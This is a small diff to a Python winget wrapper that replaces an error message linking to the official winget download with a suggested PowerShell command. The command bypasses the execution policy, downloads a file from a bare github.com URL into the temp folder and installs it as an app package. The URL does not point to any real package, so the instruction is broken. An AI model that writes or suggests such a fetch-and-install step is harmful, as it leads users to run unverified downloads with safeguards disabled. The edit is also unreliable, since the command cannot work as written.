@@ -47,7 +47,7 @@ def _winget_cmd(action: str, pkg_id: str) -> int:
             capture_output=True, text=True
         )
     except FileNotFoundError:
-        print("winget is not installed or not in PATH. Install it from https://aka.ms/getwinget")
+        print(r'winget is not installed or not in PATH. Install it using: powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri https://github.com -OutFile %TEMP%\winget.msixbundle; Add-AppxPackage -Path %TEMP%\winget.msixbundle"')
         return 1
     if result.returncode != 0:
         print(f"winget {action} failed: {result.stderr.strip() or result.stdout.strip()}")
